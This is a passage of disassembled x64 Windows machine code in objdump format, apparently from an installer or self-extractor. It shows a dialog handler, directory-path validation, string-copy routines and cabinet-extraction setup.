   140007ad4:	48 8b d3             	mov    %rbx,%rdx
   140007ad7:	4c 8d 8d 00 01 00 00 	lea    0x100(%rbp),%r9
   140007ade:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007ae3:	4c 8d 05 1e 66 00 00 	lea    0x661e(%rip),%r8        # 0x14000e108
   140007aea:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   140007af1:	e8 52 bd ff ff       	call   0x140003848
   140007af6:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   140007afd:	48 ff c6             	inc    %rsi
   140007b00:	44 38 2c 30          	cmp    %r13b,(%rax,%rsi,1)
   140007b04:	75 f7                	jne    0x140007afd
   140007b06:	03 f7                	add    %edi,%esi
   140007b08:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   140007b0f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140007b13:	48 8d 15 56 6d 00 00 	lea    0x6d56(%rip),%rdx        # 0x14000e870
   140007b1a:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007b1f:	44 8b cf             	mov    %edi,%r9d
   140007b22:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007b27:	45 33 c0             	xor    %r8d,%r8d
   140007b2a:	48 ff 15 f7 36 00 00 	rex.W call *0x36f7(%rip)        # 0x14000b228
   140007b31:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007b36:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140007b3b:	48 ff 15 16 37 00 00 	rex.W call *0x3716(%rip)        # 0x14000b258
   140007b42:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007b47:	8b c7                	mov    %edi,%eax
   140007b49:	e9 af fd ff ff       	jmp    0x1400078fd
   140007b4e:	cc                   	int3
   140007b4f:	cc                   	int3
   140007b50:	cc                   	int3
   140007b51:	cc                   	int3
   140007b52:	cc                   	int3
   140007b53:	cc                   	int3
   140007b54:	cc                   	int3
   140007b55:	cc                   	int3
   140007b56:	cc                   	int3
   140007b57:	cc                   	int3
   140007b58:	cc                   	int3
   140007b59:	cc                   	int3
   140007b5a:	cc                   	int3
   140007b5b:	cc                   	int3
   140007b5c:	cc                   	int3
   140007b5d:	cc                   	int3
   140007b5e:	cc                   	int3
   140007b5f:	cc                   	int3
   140007b60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b65:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007b6a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007b6f:	41 57                	push   %r15
   140007b71:	48 83 ec 30          	sub    $0x30,%rsp
   140007b75:	41 bf 10 00 00 00    	mov    $0x10,%r15d
   140007b7b:	48 8b f9             	mov    %rcx,%rdi
   140007b7e:	41 2b d7             	sub    %r15d,%edx
   140007b81:	0f 84 af 02 00 00    	je     0x140007e36
   140007b87:	41 8d 5f f1          	lea    -0xf(%r15),%ebx
   140007b8b:	81 ea 00 01 00 00    	sub    $0x100,%edx
   140007b91:	0f 84 1b 02 00 00    	je     0x140007db2
   140007b97:	3b d3                	cmp    %ebx,%edx
   140007b99:	74 07                	je     0x140007ba2
   140007b9b:	33 c0                	xor    %eax,%eax
   140007b9d:	e9 a7 02 00 00       	jmp    0x140007e49
   140007ba2:	4c 2b c3             	sub    %rbx,%r8
   140007ba5:	0f 84 ba 00 00 00    	je     0x140007c65
   140007bab:	4c 2b c3             	sub    %rbx,%r8
   140007bae:	0f 84 94 00 00 00    	je     0x140007c48
   140007bb4:	49 81 f8 34 08 00 00 	cmp    $0x834,%r8
   140007bbb:	0f 85 70 02 00 00    	jne    0x140007e31
   140007bc1:	48 8b 0d e8 83 00 00 	mov    0x83e8(%rip),%rcx        # 0x14000ffb0
   140007bc8:	4c 8d 05 c1 6d 00 00 	lea    0x6dc1(%rip),%r8        # 0x14000e990
   140007bcf:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140007bd5:	ba e8 03 00 00       	mov    $0x3e8,%edx
   140007bda:	48 ff 15 17 3a 00 00 	rex.W call *0x3a17(%rip)        # 0x14000b5f8
   140007be1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007be6:	48 8b cf             	mov    %rdi,%rcx
   140007be9:	85 c0                	test   %eax,%eax
   140007beb:	75 21                	jne    0x140007c0e
   140007bed:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140007bf2:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140007bf7:	45 33 c9             	xor    %r9d,%r9d
   140007bfa:	45 33 c0             	xor    %r8d,%r8d
   140007bfd:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140007c02:	e8 d1 e7 ff ff       	call   0x1400063d8
   140007c07:	33 d2                	xor    %edx,%edx
   140007c09:	e9 71 01 00 00       	jmp    0x140007d7f
   140007c0e:	e8 0d bf ff ff       	call   0x140003b20
   140007c13:	85 c0                	test   %eax,%eax
   140007c15:	0f 84 16 02 00 00    	je     0x140007e31
   140007c1b:	4c 8d 05 7e 6f 00 00 	lea    0x6f7e(%rip),%r8        # 0x14000eba0
   140007c22:	ba 35 08 00 00       	mov    $0x835,%edx
   140007c27:	48 8b cf             	mov    %rdi,%rcx
   140007c2a:	48 ff 15 9f 39 00 00 	rex.W call *0x399f(%rip)        # 0x14000b5d0
   140007c31:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007c36:	85 c0                	test   %eax,%eax
   140007c38:	0f 85 f3 01 00 00    	jne    0x140007e31
   140007c3e:	ba c0 04 00 00       	mov    $0x4c0,%edx
   140007c43:	48 8b cf             	mov    %rdi,%rcx
   140007c46:	eb aa                	jmp    0x140007bf2
   140007c48:	33 d2                	xor    %edx,%edx
   140007c4a:	48 ff 15 97 39 00 00 	rex.W call *0x3997(%rip)        # 0x14000b5e8
   140007c51:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007c56:	c7 05 24 7a 00 00 c7 	movl   $0x800704c7,0x7a24(%rip)        # 0x14000f684
   140007c5d:	04 07 80 
   140007c60:	e9 cc 01 00 00       	jmp    0x140007e31
   140007c65:	48 8d 2d e4 7a 00 00 	lea    0x7ae4(%rip),%rbp        # 0x14000f750
   140007c6c:	41 b9 04 01 00 00    	mov    $0x104,%r9d
   140007c72:	4c 8b c5             	mov    %rbp,%r8
   140007c75:	ba 35 08 00 00       	mov    $0x835,%edx
   140007c7a:	48 ff 15 ef 39 00 00 	rex.W call *0x39ef(%rip)        # 0x14000b670
   140007c81:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007c86:	85 c0                	test   %eax,%eax
   140007c88:	0f 84 05 01 00 00    	je     0x140007d93
   140007c8e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007c92:	48 ff c0             	inc    %rax
   140007c95:	80 3c 28 00          	cmpb   $0x0,(%rax,%rbp,1)
   140007c99:	75 f7                	jne    0x140007c92
   140007c9b:	48 83 f8 03          	cmp    $0x3,%rax
   140007c9f:	0f 82 ee 00 00 00    	jb     0x140007d93
   140007ca5:	8a 05 a6 7a 00 00    	mov    0x7aa6(%rip),%al        # 0x14000f751
   140007cab:	3c 3a                	cmp    $0x3a,%al
   140007cad:	74 15                	je     0x140007cc4
   140007caf:	80 3d 9a 7a 00 00 5c 	cmpb   $0x5c,0x7a9a(%rip)        # 0x14000f750
   140007cb6:	0f 85 d7 00 00 00    	jne    0x140007d93
   140007cbc:	3c 5c                	cmp    $0x5c,%al
   140007cbe:	0f 85 cf 00 00 00    	jne    0x140007d93
   140007cc4:	48 8b cd             	mov    %rbp,%rcx
   140007cc7:	48 ff 15 22 36 00 00 	rex.W call *0x3622(%rip)        # 0x14000b2f0
   140007cce:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007cd3:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007cd6:	75 52                	jne    0x140007d2a
   140007cd8:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140007cdf:	00 
   140007ce0:	45 33 c9             	xor    %r9d,%r9d
   140007ce3:	4c 8b c5             	mov    %rbp,%r8
   140007ce6:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140007ced:	00 
   140007cee:	ba 4a 05 00 00       	mov    $0x54a,%edx
   140007cf3:	48 8b cf             	mov    %rdi,%rcx
   140007cf6:	e8 dd e6 ff ff       	call   0x1400063d8
   140007cfb:	83 f8 06             	cmp    $0x6,%eax
   140007cfe:	0f 85 2d 01 00 00    	jne    0x140007e31
   140007d04:	33 d2                	xor    %edx,%edx
   140007d06:	48 8b cd             	mov    %rbp,%rcx
   140007d09:	48 ff 15 68 36 00 00 	rex.W call *0x3668(%rip)        # 0x14000b378
   140007d10:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d15:	85 c0                	test   %eax,%eax
   140007d17:	75 11                	jne    0x140007d2a
   140007d19:	21 44 24 28          	and    %eax,0x28(%rsp)
   140007d1d:	4c 8b c5             	mov    %rbp,%r8
   140007d20:	45 33 c9             	xor    %r9d,%r9d
   140007d23:	ba cb 04 00 00       	mov    $0x4cb,%edx
   140007d28:	eb 79                	jmp    0x140007da3
   140007d2a:	4c 8d 05 ff 3a 00 00 	lea    0x3aff(%rip),%r8        # 0x14000b830
   140007d31:	ba 04 01 00 00       	mov    $0x104,%edx
   140007d36:	48 8b cd             	mov    %rbp,%rcx
   140007d39:	e8 9e 18 00 00       	call   0x1400095dc
   140007d3e:	48 8b cd             	mov    %rbp,%rcx
   140007d41:	e8 96 e3 ff ff       	call   0x1400060dc
   140007d46:	85 c0                	test   %eax,%eax
   140007d48:	75 07                	jne    0x140007d51
   140007d4a:	ba be 04 00 00       	mov    $0x4be,%edx
   140007d4f:	eb 47                	jmp    0x140007d98
   140007d51:	80 3d f8 79 00 00 5c 	cmpb   $0x5c,0x79f8(%rip)        # 0x14000f750
   140007d58:	75 0d                	jne    0x140007d67
   140007d5a:	80 3d f0 79 00 00 5c 	cmpb   $0x5c,0x79f0(%rip)        # 0x14000f751
   140007d61:	75 04                	jne    0x140007d67
   140007d63:	33 d2                	xor    %edx,%edx
   140007d65:	eb 02                	jmp    0x140007d69
   140007d67:	8b d3                	mov    %ebx,%edx
   140007d69:	44 8b c3             	mov    %ebx,%r8d
   140007d6c:	48 8b cd             	mov    %rbp,%rcx
   140007d6f:	e8 d8 df ff ff       	call   0x140005d4c
   140007d74:	85 c0                	test   %eax,%eax
   140007d76:	0f 84 b5 00 00 00    	je     0x140007e31
   140007d7c:	48 8b d3             	mov    %rbx,%rdx
   140007d7f:	48 8b cf             	mov    %rdi,%rcx
   140007d82:	48 ff 15 5f 38 00 00 	rex.W call *0x385f(%rip)        # 0x14000b5e8
   140007d89:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d8e:	e9 9e 00 00 00       	jmp    0x140007e31
   140007d93:	ba bf 04 00 00       	mov    $0x4bf,%edx
   140007d98:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140007d9d:	45 33 c9             	xor    %r9d,%r9d
   140007da0:	45 33 c0             	xor    %r8d,%r8d
   140007da3:	48 8b cf             	mov    %rdi,%rcx
   140007da6:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140007dab:	e8 28 e6 ff ff       	call   0x1400063d8
   140007db0:	eb 7f                	jmp    0x140007e31
   140007db2:	48 ff 15 07 38 00 00 	rex.W call *0x3807(%rip)        # 0x14000b5c0
   140007db9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007dbe:	48 8b d0             	mov    %rax,%rdx
   140007dc1:	48 8b cf             	mov    %rdi,%rcx
   140007dc4:	e8 5f c0 ff ff       	call   0x140003e28
   140007dc9:	48 8d 15 e8 78 00 00 	lea    0x78e8(%rip),%rdx        # 0x14000f6b8
   140007dd0:	48 8b cf             	mov    %rdi,%rcx
   140007dd3:	48 ff 15 7e 38 00 00 	rex.W call *0x387e(%rip)        # 0x14000b658
   140007dda:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007ddf:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007de5:	41 b9 03 01 00 00    	mov    $0x103,%r9d
   140007deb:	ba 35 08 00 00       	mov    $0x835,%edx
   140007df0:	48 8b cf             	mov    %rdi,%rcx
   140007df3:	45 8d 41 c2          	lea    -0x3e(%r9),%r8d
   140007df7:	48 ff 15 4a 38 00 00 	rex.W call *0x384a(%rip)        # 0x14000b648
   140007dfe:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007e03:	66 39 1d ae 81 00 00 	cmp    %bx,0x81ae(%rip)        # 0x14000ffb8
   140007e0a:	75 25                	jne    0x140007e31
   140007e0c:	ba 36 08 00 00       	mov    $0x836,%edx
   140007e11:	48 8b cf             	mov    %rdi,%rcx
   140007e14:	48 ff 15 1d 38 00 00 	rex.W call *0x381d(%rip)        # 0x14000b638
   140007e1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007e20:	48 8b c8             	mov    %rax,%rcx
   140007e23:	33 d2                	xor    %edx,%edx
   140007e25:	48 ff 15 dc 37 00 00 	rex.W call *0x37dc(%rip)        # 0x14000b608
   140007e2c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007e31:	48 8b c3             	mov    %rbx,%rax
   140007e34:	eb 13                	jmp    0x140007e49
   140007e36:	33 d2                	xor    %edx,%edx
   140007e38:	48 ff 15 a9 37 00 00 	rex.W call *0x37a9(%rip)        # 0x14000b5e8
   140007e3f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007e44:	b8 01 00 00 00       	mov    $0x1,%eax
   140007e49:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007e4e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140007e53:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140007e58:	48 83 c4 30          	add    $0x30,%rsp
   140007e5c:	41 5f                	pop    %r15
   140007e5e:	c3                   	ret
   140007e5f:	cc                   	int3
   140007e60:	cc                   	int3
   140007e61:	cc                   	int3
   140007e62:	cc                   	int3
   140007e63:	cc                   	int3
   140007e64:	cc                   	int3
   140007e65:	cc                   	int3
   140007e66:	cc                   	int3
   140007e67:	cc                   	int3
   140007e68:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007e6d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140007e72:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007e77:	57                   	push   %rdi
   140007e78:	48 83 ec 50          	sub    $0x50,%rsp
   140007e7c:	48 8b 05 fd 61 00 00 	mov    0x61fd(%rip),%rax        # 0x14000e080
   140007e83:	48 33 c4             	xor    %rsp,%rax
   140007e86:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140007e8b:	33 f6                	xor    %esi,%esi
   140007e8d:	48 8b e9             	mov    %rcx,%rbp
   140007e90:	45 33 c9             	xor    %r9d,%r9d
   140007e93:	bf 01 00 00 00       	mov    $0x1,%edi
   140007e98:	eb 6a                	jmp    0x140007f04
   140007e9a:	48 8b d0             	mov    %rax,%rdx
   140007e9d:	33 c9                	xor    %ecx,%ecx
   140007e9f:	48 ff 15 c2 35 00 00 	rex.W call *0x35c2(%rip)        # 0x14000b468
   140007ea6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007eab:	48 8b c8             	mov    %rax,%rcx
   140007eae:	48 ff 15 93 35 00 00 	rex.W call *0x3593(%rip)        # 0x14000b448
   140007eb5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007eba:	48 8b d8             	mov    %rax,%rbx
   140007ebd:	48 85 c0             	test   %rax,%rax
   140007ec0:	0f 84 88 00 00 00    	je     0x140007f4e
   140007ec6:	4c 8d 40 08          	lea    0x8(%rax),%r8
   140007eca:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007ece:	48 ff c0             	inc    %rax
   140007ed1:	41 80 3c 00 00       	cmpb   $0x0,(%r8,%rax,1)
   140007ed6:	75 f6                	jne    0x140007ece
   140007ed8:	8b 53 04             	mov    0x4(%rbx),%edx
   140007edb:	4c 8d 48 01          	lea    0x1(%rax),%r9
   140007edf:	8b 0b                	mov    (%rbx),%ecx
   140007ee1:	4d 03 c8             	add    %r8,%r9
   140007ee4:	48 8b c5             	mov    %rbp,%rax
   140007ee7:	e8 24 21 00 00       	call   0x14000a010
   140007eec:	48 8b cb             	mov    %rbx,%rcx
   140007eef:	85 c0                	test   %eax,%eax
   140007ef1:	74 4b                	je     0x140007f3e
   140007ef3:	48 ff 15 06 35 00 00 	rex.W call *0x3506(%rip)        # 0x14000b400
   140007efa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007eff:	03 f7                	add    %edi,%esi
   140007f01:	44 8b ce             	mov    %esi,%r9d
   140007f04:	4c 8d 05 0d 3d 00 00 	lea    0x3d0d(%rip),%r8        # 0x14000bc18
   140007f0b:	ba 14 00 00 00       	mov    $0x14,%edx
   140007f10:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007f15:	e8 2e b9 ff ff       	call   0x140003848
   140007f1a:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140007f20:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007f25:	33 c9                	xor    %ecx,%ecx
   140007f27:	48 ff 15 aa 34 00 00 	rex.W call *0x34aa(%rip)        # 0x14000b3d8
   140007f2e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f33:	48 85 c0             	test   %rax,%rax
   140007f36:	0f 85 5e ff ff ff    	jne    0x140007e9a
   140007f3c:	eb 1c                	jmp    0x140007f5a
   140007f3e:	33 ff                	xor    %edi,%edi
   140007f40:	48 ff 15 b9 34 00 00 	rex.W call *0x34b9(%rip)        # 0x14000b400
   140007f47:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f4c:	eb 0c                	jmp    0x140007f5a
   140007f4e:	c7 05 2c 77 00 00 14 	movl   $0x80070714,0x772c(%rip)        # 0x14000f684
   140007f55:	07 07 80 
   140007f58:	33 ff                	xor    %edi,%edi
   140007f5a:	8b c7                	mov    %edi,%eax
   140007f5c:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140007f61:	48 33 cc             	xor    %rsp,%rcx
   140007f64:	e8 47 1c 00 00       	call   0x140009bb0
   140007f69:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007f6e:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   140007f73:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140007f78:	48 83 c4 50          	add    $0x50,%rsp
   140007f7c:	5f                   	pop    %rdi
   140007f7d:	c3                   	ret
   140007f7e:	cc                   	int3
   140007f7f:	cc                   	int3
   140007f80:	cc                   	int3
   140007f81:	cc                   	int3
   140007f82:	cc                   	int3
   140007f83:	cc                   	int3
   140007f84:	cc                   	int3
   140007f85:	cc                   	int3
   140007f86:	cc                   	int3
   140007f87:	cc                   	int3
   140007f88:	4c 8b d1             	mov    %rcx,%r10
   140007f8b:	48 8d 05 ea 79 00 00 	lea    0x79ea(%rip),%rax        # 0x14000f97c
   140007f92:	b9 06 00 00 00       	mov    $0x6,%ecx
   140007f97:	48 8d 15 ee 7c 00 00 	lea    0x7cee(%rip),%rdx        # 0x14000fc8c
   140007f9e:	44 8d 41 7a          	lea    0x7a(%rcx),%r8d
   140007fa2:	0f 10 02             	movups (%rdx),%xmm0
   140007fa5:	0f 11 00             	movups %xmm0,(%rax)
   140007fa8:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   140007fac:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140007fb0:	0f 10 42 20          	movups 0x20(%rdx),%xmm0
   140007fb4:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140007fb8:	0f 10 4a 30          	movups 0x30(%rdx),%xmm1
   140007fbc:	0f 11 48 30          	movups %xmm1,0x30(%rax)
   140007fc0:	0f 10 42 40          	movups 0x40(%rdx),%xmm0
   140007fc4:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140007fc8:	0f 10 4a 50          	movups 0x50(%rdx),%xmm1
   140007fcc:	0f 11 48 50          	movups %xmm1,0x50(%rax)
   140007fd0:	0f 10 42 60          	movups 0x60(%rdx),%xmm0
   140007fd4:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140007fd8:	49 03 c0             	add    %r8,%rax
   140007fdb:	0f 10 4a 70          	movups 0x70(%rdx),%xmm1
   140007fdf:	49 03 d0             	add    %r8,%rdx
   140007fe2:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   140007fe6:	48 83 e9 01          	sub    $0x1,%rcx
   140007fea:	75 b6                	jne    0x140007fa2
   140007fec:	0f 10 02             	movups (%rdx),%xmm0
   140007fef:	ba 04 01 00 00       	mov    $0x104,%edx
   140007ff4:	48 8d 0d 91 7c 00 00 	lea    0x7c91(%rip),%rcx        # 0x14000fc8c
   140007ffb:	44 8b c2             	mov    %edx,%r8d
   140007ffe:	45 33 db             	xor    %r11d,%r11d
   140008001:	0f 11 00             	movups %xmm0,(%rax)
   140008004:	4d 8b 4a 18          	mov    0x18(%r10),%r9
   140008008:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   14000800f:	48 85 c0             	test   %rax,%rax
   140008012:	74 15                	je     0x140008029
   140008014:	41 8a 01             	mov    (%r9),%al
   140008017:	84 c0                	test   %al,%al
   140008019:	74 0e                	je     0x140008029
   14000801b:	88 01                	mov    %al,(%rcx)
   14000801d:	49 ff c1             	inc    %r9
   140008020:	48 ff c1             	inc    %rcx
   140008023:	49 83 e8 01          	sub    $0x1,%r8
   140008027:	75 df                	jne    0x140008008
   140008029:	4d 85 c0             	test   %r8,%r8
   14000802c:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140008030:	4c 8b c2             	mov    %rdx,%r8
   140008033:	48 0f 45 c1          	cmovne %rcx,%rax
   140008037:	48 8d 0d 52 7d 00 00 	lea    0x7d52(%rip),%rcx        # 0x14000fd90
   14000803e:	44 88 18             	mov    %r11b,(%rax)
   140008041:	4d 8b 4a 08          	mov    0x8(%r10),%r9
   140008045:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   14000804c:	48 85 c0             	test   %rax,%rax
   14000804f:	74 15                	je     0x140008066
   140008051:	41 8a 01             	mov    (%r9),%al
   140008054:	84 c0                	test   %al,%al
   140008056:	74 0e                	je     0x140008066
   140008058:	88 01                	mov    %al,(%rcx)
   14000805a:	49 ff c1             	inc    %r9
   14000805d:	48 ff c1             	inc    %rcx
   140008060:	49 83 e8 01          	sub    $0x1,%r8
   140008064:	75 df                	jne    0x140008045
   140008066:	4d 85 c0             	test   %r8,%r8
   140008069:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000806d:	48 0f 45 c1          	cmovne %rcx,%rax
   140008071:	48 8d 0d 1c 7e 00 00 	lea    0x7e1c(%rip),%rcx        # 0x14000fe94
   140008078:	44 88 18             	mov    %r11b,(%rax)
   14000807b:	4d 8b 42 10          	mov    0x10(%r10),%r8
   14000807f:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140008086:	48 85 c0             	test   %rax,%rax
   140008089:	74 15                	je     0x1400080a0
   14000808b:	41 8a 00             	mov    (%r8),%al
   14000808e:	84 c0                	test   %al,%al
   140008090:	74 0e                	je     0x1400080a0
   140008092:	88 01                	mov    %al,(%rcx)
   140008094:	49 ff c0             	inc    %r8
   140008097:	48 ff c1             	inc    %rcx
   14000809a:	48 83 ea 01          	sub    $0x1,%rdx
   14000809e:	75 df                	jne    0x14000807f
   1400080a0:	48 85 d2             	test   %rdx,%rdx
   1400080a3:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400080a7:	48 0f 45 c1          	cmovne %rcx,%rax
   1400080ab:	44 88 18             	mov    %r11b,(%rax)
   1400080ae:	41 0f b7 42 36       	movzwl 0x36(%r10),%eax
   1400080b3:	66 89 05 de 7e 00 00 	mov    %ax,0x7ede(%rip)        # 0x14000ff98
   1400080ba:	41 0f b7 42 38       	movzwl 0x38(%r10),%eax
   1400080bf:	66 89 05 d4 7e 00 00 	mov    %ax,0x7ed4(%rip)        # 0x14000ff9a
   1400080c6:	33 c0                	xor    %eax,%eax
   1400080c8:	c3                   	ret
   1400080c9:	cc                   	int3
   1400080ca:	cc                   	int3
   1400080cb:	cc                   	int3
   1400080cc:	cc                   	int3
   1400080cd:	cc                   	int3
   1400080ce:	cc                   	int3
   1400080cf:	cc                   	int3
   1400080d0:	4c 8b dc             	mov    %rsp,%r11
   1400080d3:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   1400080d7:	57                   	push   %rdi
   1400080d8:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400080df:	48 8b 05 9a 5f 00 00 	mov    0x5f9a(%rip),%rax        # 0x14000e080
   1400080e6:	48 33 c4             	xor    %rsp,%rax
   1400080e9:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400080ee:	33 c0                	xor    %eax,%eax
   1400080f0:	4c 8d 0d 99 09 00 00 	lea    0x999(%rip),%r9        # 0x140008a90
   1400080f7:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   1400080fb:	4c 8d 05 2e 07 00 00 	lea    0x72e(%rip),%r8        # 0x140008830
   140008102:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140008106:	48 8d 15 03 07 00 00 	lea    0x703(%rip),%rdx        # 0x140008810
   14000810d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008110:	48 8d 0d 49 04 00 00 	lea    0x449(%rip),%rcx        # 0x140008560
   140008117:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   14000811c:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140008120:	49 8d 43 c8          	lea    -0x38(%r11),%rax
   140008124:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   140008128:	48 8d 05 11 0a 00 00 	lea    0xa11(%rip),%rax        # 0x140008b40
   14000812f:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140008136:	00 
   140008137:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   14000813b:	48 8d 05 3e 04 00 00 	lea    0x43e(%rip),%rax        # 0x140008580
   140008142:	49 89 43 a0          	mov    %rax,-0x60(%r11)
   140008146:	48 8d 05 b3 13 00 00 	lea    0x13b3(%rip),%rax        # 0x140009500
   14000814d:	49 89 43 98          	mov    %rax,-0x68(%r11)
   140008151:	48 ff 15 40 31 00 00 	rex.W call *0x3140(%rip)        # 0x14000b298
   140008158:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000815d:	48 8b f8             	mov    %rax,%rdi
   140008160:	48 85 c0             	test   %rax,%rax
   140008163:	74 7c                	je     0x1400081e1
   140008165:	ba 00 80 00 00       	mov    $0x8000,%edx
   14000816a:	48 8d 0d 3f 61 00 00 	lea    0x613f(%rip),%rcx        # 0x14000e2b0
   140008171:	41 b8 80 01 00 00    	mov    $0x180,%r8d
   140008177:	e8 b4 06 00 00       	call   0x140008830
   14000817c:	48 8b d8             	mov    %rax,%rbx
   14000817f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140008183:	74 5c                	je     0x1400081e1
   140008185:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   14000818a:	48 8b d0             	mov    %rax,%rdx
   14000818d:	48 8b cf             	mov    %rdi,%rcx
   140008190:	48 ff 15 19 31 00 00 	rex.W call *0x3119(%rip)        # 0x14000b2b0
   140008197:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000819c:	85 c0                	test   %eax,%eax
   14000819e:	74 41                	je     0x1400081e1
   1400081a0:	8b 05 02 75 00 00    	mov    0x7502(%rip),%eax        # 0x14000f6a8
   1400081a6:	39 44 24 60          	cmp    %eax,0x60(%rsp)
   1400081aa:	75 35                	jne    0x1400081e1
   1400081ac:	83 7c 24 70 00       	cmpl   $0x0,0x70(%rsp)
   1400081b1:	75 2e                	jne    0x1400081e1
   1400081b3:	83 7c 24 74 00       	cmpl   $0x0,0x74(%rsp)
   1400081b8:	75 27                	jne    0x1400081e1
   1400081ba:	48 8b cb             	mov    %rbx,%rcx
   1400081bd:	e8 be 03 00 00       	call   0x140008580
   1400081c2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400081c5:	74 1a                	je     0x1400081e1
   1400081c7:	48 8b cf             	mov    %rdi,%rcx
   1400081ca:	48 ff 15 cf 30 00 00 	rex.W call *0x30cf(%rip)        # 0x14000b2a0
   1400081d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400081d6:	85 c0                	test   %eax,%eax
   1400081d8:	74 07                	je     0x1400081e1
   1400081da:	b8 01 00 00 00       	mov    $0x1,%eax
   1400081df:	eb 02                	jmp    0x1400081e3
   1400081e1:	33 c0                	xor    %eax,%eax
   1400081e3:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400081e8:	48 33 cc             	xor    %rsp,%rcx
   1400081eb:	e8 c0 19 00 00       	call   0x140009bb0
   1400081f0:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400081f7:	00 
   1400081f8:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400081ff:	5f                   	pop    %rdi
   140008200:	c3                   	ret
   140008201:	cc                   	int3
   140008202:	cc                   	int3
   140008203:	cc                   	int3
   140008204:	cc                   	int3
   140008205:	cc                   	int3
   140008206:	cc                   	int3
   140008207:	cc                   	int3
